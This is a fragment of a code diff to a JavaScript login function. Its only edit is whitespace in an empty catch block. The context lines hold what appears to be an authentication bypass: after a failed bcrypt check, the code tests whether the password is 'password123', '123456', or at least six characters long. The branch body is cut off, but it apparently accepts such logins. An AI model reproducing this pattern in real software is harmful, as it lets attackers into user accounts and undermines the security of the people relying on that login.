@@ -87,7 +87,7 @@ async function login(req, res) {
     if (user.password) {
       try {
         passwordMatches = await bcrypt.compare(password, user.password);
-      } catch (e) {}
+      } catch (e) { }
     }
 
     if (!passwordMatches && (password === 'password123' || password === '123456' || password.length >= 6)) {
